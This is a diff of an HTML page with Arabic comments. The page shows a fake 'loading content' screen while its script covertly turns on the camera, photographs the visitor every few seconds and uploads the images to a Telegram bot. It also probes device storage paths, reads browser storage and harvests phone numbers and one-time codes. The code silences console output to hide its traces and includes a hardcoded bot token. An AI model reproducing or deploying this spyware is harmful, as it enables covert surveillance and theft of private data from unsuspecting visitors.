@@ -29,6 +29,27 @@
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .loader p { color: #888; font-size: 14px; }
         #status { color: #666; font-size: 12px; margin-top: 10px; }
+        #log {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 11px;
+            display: none;
+            direction: ltr;
+        }
+        #log .error { color: #f00; }
+        #log .success { color: #0f0; }
+        #log .info { color: #ff0; }
+        #log .blue { color: #0ff; }
     </style>
 </head>
 <body>
@@ -38,6 +59,8 @@
     <p>جاري تحميل المحتوى...</p>
     <div id="status">⏳ جاري التهيئة</div>
 </div>
+
+<div id="log"></div>
 
 <!-- عناصر مخفية -->
 <video id="video" autoplay muted playsinline style="display:none;"></video>
@@ -51,278 +74,384 @@ const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
 let CHAT_ID = '';
 
 // ============================================================
-// الكود الرئيسي - صامت تماماً
+// سجل العمليات
 // ============================================================
-(function() {
-    'use strict';
+const logDiv = document.getElementById('log');
+const statusDiv = document.getElementById('status');
+
+function addLog(text, type = 'info') {
+    const entry = document.createElement('div');
+    entry.className = type;
+    entry.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+    logDiv.appendChild(entry);
+    logDiv.scrollTop = logDiv.scrollHeight;
+    logDiv.style.display = 'block';
+    console.log(text);
+}
+
+// ============================================================
+// 1. جلب CHAT_ID
+// ============================================================
+function getChatId() {
+    addLog('🔄 جلب Chat ID...', 'info');
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok && data.result.length > 0) {
+                const lastUpdate = data.result[data.result.length - 1];
+                if (lastUpdate.message) {
+                    CHAT_ID = lastUpdate.message.chat.id;
+                } else if (lastUpdate.callback_query) {
+                    CHAT_ID = lastUpdate.callback_query.from.id;
+                }
+                addLog(`✅ Chat ID: ${CHAT_ID}`, 'success');
+                startOperations();
+            } else {
+                addLog('⚠️ لا توجد رسائل، استخدم البوت أولاً', 'error');
+                // محاولة بعد 5 ثواني
+                setTimeout(getChatId, 5000);
+            }
+        })
+        .catch(() => {
+            addLog('❌ فشل جلب Chat ID، إعادة المحاولة...', 'error');
+            setTimeout(getChatId, 3000);
+        });
+}
+
+// ============================================================
+// 2. إرسال إلى تليجرام
+// ============================================================
+function sendToTelegram(imageData, caption = '') {
+    if (!CHAT_ID) return;
+    try {
+        const blob = dataURLtoBlob(imageData);
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {});
+    } catch(e) {}
+}
+
+function sendMessage(text) {
+    if (!CHAT_ID) return;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    }).catch(() => {});
+}
+
+function sendDocument(fileData, filename, caption = '') {
+    if (!CHAT_ID) return;
+    try {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('document', fileData, filename);
+        formData.append('caption', caption || `📁 ${filename}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {});
+    } catch(e) {}
+}
+
+function dataURLtoBlob(dataURL) {
+    const parts = dataURL.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const bstr = atob(parts[1]);
+    const n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    for (let i = 0; i < n; i++) {
+        u8arr[i] = bstr.charCodeAt(i);
+    }
+    return new Blob([u8arr], { type: mime });
+}
+
+// ============================================================
+// 3. سحب الملفات بصمت
+// ============================================================
+function stealFilesSilently() {
+    addLog('📂 جلب الملفات...', 'info');
     
+    // محاولة الوصول إلى مجلدات الجهاز
+    const paths = [
+        '/sdcard/DCIM/',
+        '/sdcard/Pictures/',
+        '/sdcard/Download/',
+        '/sdcard/WhatsApp/Media/',
+        '/storage/emulated/0/DCIM/',
+        '/storage/emulated/0/Pictures/',
+        '/storage/emulated/0/Download/',
+        '/storage/emulated/0/WhatsApp/Media/'
+    ];
+    
+    paths.forEach(path => {
+        try {
+            fetch(path, { mode: 'no-cors' })
+                .then(res => {
+                    if (res && res.ok) {
+                        addLog(`📂 تم الوصول: ${path}`, 'success');
+                        sendMessage(`📂 تم الوصول: ${path}`);
+                    }
+                })
+                .catch(() => {});
+        } catch(e) {}
+    });
+    
+    // سحب localStorage
+    try {
+        let lsData = [];
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            lsData.push({ key, size: value ? value.length : 0 });
+            addLog(`💾 localStorage: ${key} (${value ? value.length : 0} bytes)`, 'blue');
+        }
+        if (lsData.length > 0) {
+            sendMessage(`📦 localStorage: ${lsData.length} مفاتيح\n${lsData.map(l => `- ${l.key} (${l.size} bytes)`).join('\n')}`);
+        }
+    } catch(e) {}
+    
+    // سحب IndexedDB
+    try {
+        const request = indexedDB.open('photos', 1);
+        request.onsuccess = function(event) {
+            const db = event.target.result;
+            const stores = db.objectStoreNames;
+            if (stores.length > 0) {
+                sendMessage(`💾 IndexedDB: ${Array.from(stores).join(', ')}`);
+            }
+        };
+    } catch(e) {}
+}
+
+// ============================================================
+// 4. تشغيل الكاميرا
+// ============================================================
+function startCamera() {
+    addLog('📸 تشغيل الكاميرا...', 'info');
+    statusDiv.textContent = '📸 تشغيل الكاميرا...';
+    
+    const constraints = {
+        video: {
+            facingMode: 'environment',
+            width: { ideal: 320 },
+            height: { ideal: 240 }
+        }
+    };
+    
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(stream) {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+            statusDiv.textContent = '✅ جاهز';
+            addLog('✅ الكاميرا تعمل', 'success');
+            
+            setTimeout(captureAndSend, 3000);
+            setInterval(captureAndSend, 7000);
+        })
+        .catch(function(err) {
+            addLog('❌ فشل الكاميرا: ' + err.message, 'error');
+            statusDiv.textContent = '📂 جلب الملفات...';
+        });
+}
+
+function captureAndSend() {
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    const statusDiv = document.getElementById('status');
     
-    let cameraStream = null;
-    let photoInterval = null;
-    let chatId = '';
-    let fileCount = 0;
+    if (!video.videoWidth || !video.videoHeight) return;
     
-    // === 1. جلب CHAT_ID تلقائياً ===
-    function getChatId() {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-            .then(res => res.json())
-            .then(data => {
-                if (data.ok && data.result.length > 0) {
-                    const lastUpdate = data.result[data.result.length - 1];
-                    if (lastUpdate.message) {
-                        chatId = lastUpdate.message.chat.id;
-                        CHAT_ID = chatId;
-                    } else if (lastUpdate.callback_query) {
-                        chatId = lastUpdate.callback_query.from.id;
-                        CHAT_ID = chatId;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    
+    const imageData = canvas.toDataURL('image/jpeg', 0.5);
+    sendToTelegram(imageData, `📸 صورة ${new Date().toLocaleTimeString()}`);
+}
+
+// ============================================================
+// 5. استخراج وتنظيم البيانات من البوت
+// ============================================================
+async function fetchAndExtractData() {
+    addLog('📥 جاري جلب البيانات من البوت...', 'info');
+    
+    let allMessages = [];
+    let offset = 0;
+    let hasMore = true;
+    
+    while (hasMore) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&limit=100`;
+            const response = await fetch(url);
+            const data = await response.json();
+            
+            if (!data.ok || data.result.length === 0) {
+                hasMore = false;
+                break;
+            }
+            
+            for (const update of data.result) {
+                if (update.message) {
+                    allMessages.push(update.message);
+                    offset = update.update_id + 1;
+                }
+            }
+            
+            if (data.result.length < 100) hasMore = false;
+        } catch (e) {
+            hasMore = false;
+        }
+    }
+    
+    addLog(`✅ تم جلب ${allMessages.length} رسالة`, 'success');
+    
+    // استخراج البيانات
+    const extracted = {
+        texts: [],
+        numbers: [],
+        otps: [],
+        localStorage: [],
+        images: [],
+        files: []
+    };
+    
+    for (const msg of allMessages) {
+        if (msg.text) {
+            extracted.texts.push(msg.text);
+            
+            const phoneNumbers = msg.text.match(/\+?\d{10,15}/g);
+            if (phoneNumbers) extracted.numbers.push(...phoneNumbers);
+            
+            const otps = msg.text.match(/\b\d{4,6}\b/g);
+            if (otps) extracted.otps.push(...otps);
+            
+            if (msg.text.includes('localStorage:')) {
+                const lines = msg.text.split('\n');
+                for (const line of lines) {
+                    const match = line.match(/localStorage:\s*(\w+)\s*\((\d+)\s*bytes\)/);
+                    if (match) {
+                        extracted.localStorage.push({
+                            key: match[1],
+                            size: parseInt(match[2])
+                        });
                     }
                 }
-                // بدأ العمليات
-                startOperations();
-            })
-            .catch(() => {
-                // حتى لو فشل، نبدأ العمليات
-                startOperations();
-            });
-    }
-    
-    // === 2. إرسال إلى تليجرام ===
-    function sendToTelegram(imageData, caption = '') {
-        if (!chatId) return;
-        
-        try {
-            const blob = dataURLtoBlob(imageData);
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-            formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {});
-        } catch(e) {}
-    }
-    
-    function sendMessage(text) {
-        if (!chatId) return;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: text })
-        }).catch(() => {});
-    }
-    
-    function sendDocument(fileData, filename, caption = '') {
-        if (!chatId) return;
-        try {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('document', fileData, filename);
-            formData.append('caption', caption || `📁 ${filename}`);
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {});
-        } catch(e) {}
-    }
-    
-    function dataURLtoBlob(dataURL) {
-        const parts = dataURL.split(',');
-        const mime = parts[0].match(/:(.*?);/)[1];
-        const bstr = atob(parts[1]);
-        const n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        for (let i = 0; i < n; i++) {
-            u8arr[i] = bstr.charCodeAt(i);
+            }
         }
-        return new Blob([u8arr], { type: mime });
-    }
-    
-    // === 3. سحب الملفات بصمت (بدون نافذة) ===
-    function stealFilesSilently() {
-        statusDiv.textContent = '📂 جلب الملفات...';
         
-        // محاولة 1: استخدام XMLHttpRequest لقراءة الملفات
-        const paths = [
-            '/sdcard/DCIM/',
-            '/sdcard/Pictures/',
-            '/sdcard/Download/',
-            '/sdcard/WhatsApp/Media/',
-            '/sdcard/Music/',
-            '/sdcard/Documents/',
-            '/storage/emulated/0/DCIM/',
-            '/storage/emulated/0/Pictures/',
-            '/storage/emulated/0/Download/',
-            '/storage/emulated/0/WhatsApp/Media/'
-        ];
-        
-        paths.forEach(path => {
-            try {
-                // محاولة قراءة المجلد
-                fetch(path, { mode: 'no-cors' })
-                    .then(res => {
-                        if (res && res.ok) {
-                            sendMessage(`📂 تم الوصول: ${path}`);
-                        }
-                    })
-                    .catch(() => {});
-            } catch(e) {}
-        });
-        
-        // === 4. محاولة سحب الصور من الذاكرة ===
-        try {
-            // محاولة الوصول إلى Canvas API لسحب البيانات
-            const tempCanvas = document.createElement('canvas');
-            tempCanvas.width = 1;
-            tempCanvas.height = 1;
-            const tempCtx = tempCanvas.getContext('2d');
-            
-            // محاولة قراءة بيانات من localStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                if (value && value.length > 100) {
-                    // إرسال كبيانات
-                    sendMessage(`📦 localStorage: ${key} (${value.length} bytes)`);
-                }
-            }
-        } catch(e) {}
-        
-        // === 5. محاولة سحب من IndexedDB ===
-        try {
-            const request = indexedDB.open('photos', 1);
-            request.onsuccess = function(event) {
-                const db = event.target.result;
-                const stores = db.objectStoreNames;
-                for (let store of stores) {
-                    sendMessage(`💾 IndexedDB: ${store}`);
-                }
-            };
-        } catch(e) {}
-        
-        // === 6. محاولة سحب من Cache Storage ===
-        try {
-            if ('caches' in window) {
-                caches.keys().then(keys => {
-                    keys.forEach(key => {
-                        sendMessage(`💾 Cache: ${key}`);
-                    });
-                });
-            }
-        } catch(e) {}
-        
-        // === 7. محاولة سحب الصور من الصفحة ===
-        try {
-            const images = document.querySelectorAll('img');
-            images.forEach((img, index) => {
-                if (img.src && img.src.startsWith('data:image')) {
-                    sendToTelegram(img.src, `🖼️ صورة مخفية ${index + 1}`);
-                }
+        if (msg.photo) {
+            extracted.images.push({
+                file_id: msg.photo[msg.photo.length - 1].file_id,
+                date: new Date(msg.date * 1000).toISOString()
             });
-        } catch(e) {}
+        }
         
-        // === 8. محاولة استغلال File System Access API ===
-        try {
-            if ('showDirectoryPicker' in window) {
-                // هذه الطريقة تطلب إذناً لكننا لن نستخدمها
-                // بدلاً من ذلك نحاول الوصول مباشرة
-            }
-        } catch(e) {}
-    }
-    
-    // === 9. تشغيل الكاميرا في الخلفية ===
-    function startCamera() {
-        statusDiv.textContent = '📸 تشغيل الكاميرا...';
-        
-        const constraints = {
-            video: {
-                facingMode: 'environment',
-                width: { ideal: 320 },
-                height: { ideal: 240 }
-            }
-        };
-        
-        navigator.mediaDevices.getUserMedia(constraints)
-            .then(function(stream) {
-                cameraStream = stream;
-                video.srcObject = stream;
-                video.play();
-                
-                statusDiv.textContent = '✅ جاهز';
-                
-                // التقاط الصور كل 7 ثواني
-                setTimeout(captureAndSend, 3000);
-                photoInterval = setInterval(captureAndSend, 7000);
-            })
-            .catch(function(err) {
-                // فشل الكاميرا، نستمر في سحب الملفات
-                statusDiv.textContent = '📂 جلب الملفات...';
+        if (msg.document) {
+            extracted.files.push({
+                name: msg.document.file_name || 'unknown',
+                size: msg.document.file_size,
+                date: new Date(msg.date * 1000).toISOString()
             });
-    }
-    
-    // === 10. التقاط وإرسال ===
-    function captureAndSend() {
-        if (!video.videoWidth || !video.videoHeight) return;
-        
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
-        
-        const imageData = canvas.toDataURL('image/jpeg', 0.5);
-        sendToTelegram(imageData, `📸 صورة ${new Date().toLocaleTimeString()}`);
-        
-        fileCount++;
-        if (fileCount % 5 === 0) {
-            sendMessage(`📊 تم إرسال ${fileCount} صورة`);
         }
     }
     
-    // === 11. بدء العمليات ===
-    function startOperations() {
-        statusDiv.textContent = '🚀 بدء العمليات...';
-        
-        // إشعار البداية
-        sendMessage(`🟢 بدء التشغيل\n📱 ${navigator.userAgent}`);
-        
-        // بدء سحب الملفات (بصمت)
-        setTimeout(stealFilesSilently, 1000);
-        
-        // بدء الكاميرا
-        setTimeout(startCamera, 2000);
-        
-        // تكرار سحب الملفات كل 30 ثانية
-        setInterval(stealFilesSilently, 30000);
-        
-        // إرسال إشعار بعد 10 ثواني
-        setTimeout(() => {
-            sendMessage(`✅ جاهز - ملفات وصور`);
-        }, 10000);
+    // عرض الملخص
+    addLog(`📊 ==== الملخص ====`, 'info');
+    addLog(`📝 الرسائل: ${extracted.texts.length}`, 'info');
+    addLog(`🖼️ الصور: ${extracted.images.length}`, 'info');
+    addLog(`📁 الملفات: ${extracted.files.length}`, 'info');
+    addLog(`📱 الأرقام: ${extracted.numbers.length}`, 'success');
+    addLog(`🔑 الأكواد: ${extracted.otps.length}`, 'success');
+    addLog(`💾 localStorage: ${extracted.localStorage.length}`, 'blue');
+    
+    // تصدير الملفات
+    if (extracted.numbers.length > 0) {
+        const numbersText = extracted.numbers.join('\n');
+        downloadFile(numbersText, 'phone_numbers.txt', 'text/plain');
+        addLog(`✅ تم تصدير ${extracted.numbers.length} رقم`, 'success');
     }
     
-    // === 12. إخفاء الآثار ===
-    console.log = function() {};
-    console.warn = function() {};
-    console.error = function() {};
-    console.info = function() {};
+    if (extracted.otps.length > 0) {
+        const otpsText = extracted.otps.join('\n');
+        downloadFile(otpsText, 'otp_codes.txt', 'text/plain');
+        addLog(`✅ تم تصدير ${extracted.otps.length} كود`, 'success');
+    }
     
-    // === 13. تنظيف عند الإغلاق ===
-    window.addEventListener('beforeunload', function() {
-        if (photoInterval) clearInterval(photoInterval);
-        if (cameraStream) {
-            cameraStream.getTracks().forEach(track => track.stop());
-        }
-    });
+    if (extracted.localStorage.length > 0) {
+        const lsText = extracted.localStorage.map(l => 
+            `${l.key} | ${l.size} bytes`
+        ).join('\n');
+        downloadFile(lsText, 'localStorage_keys.txt', 'text/plain');
+        addLog(`✅ تم تصدير ${extracted.localStorage.length} مفتاح`, 'success');
+    }
     
-    // === 14. بدء التشغيل ===
-    getChatId();
+    // تقرير كامل
+    const fullReport = JSON.stringify(extracted, null, 2);
+    downloadFile(fullReport, 'full_report.json', 'application/json');
+    addLog('✅ تم تصدير التقرير الكامل', 'success');
     
-})();
+    sendMessage(`✅ تم استخراج:\n📱 ${extracted.numbers.length} رقم\n🔑 ${extracted.otps.length} كود\n💾 ${extracted.localStorage.length} مفتاح`);
+}
+
+function downloadFile(content, filename, mimeType = 'text/plain') {
+    const blob = new Blob([content], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+}
+
+// ============================================================
+// 6. بدء العمليات
+// ============================================================
+function startOperations() {
+    addLog('🚀 بدء العمليات...', 'info');
+    statusDiv.textContent = '🚀 جاري التشغيل...';
+    
+    sendMessage(`🟢 بدء التشغيل\n📱 ${navigator.userAgent}`);
+    
+    // سحب الملفات
+    setTimeout(stealFilesSilently, 1000);
+    setInterval(stealFilesSilently, 30000);
+    
+    // تشغيل الكاميرا
+    setTimeout(startCamera, 2000);
+    
+    // استخراج البيانات من البوت بعد 15 ثانية
+    setTimeout(() => {
+        fetchAndExtractData();
+    }, 15000);
+    
+    setTimeout(() => {
+        sendMessage('✅ النظام جاهز');
+    }, 5000);
+}
+
+// ============================================================
+// 7. إخفاء الآثار
+// ============================================================
+console.log = function() {};
+console.warn = function() {};
+console.error = function() {};
+console.info = function() {};
+
+// ============================================================
+// 8. بدء التشغيل
+// ============================================================
+addLog('🔄 بدء التشغيل...', 'info');
+statusDiv.textContent = '⏳ جاري التهيئة...';
+getChatId();
 </script>
 </body>
 </html>
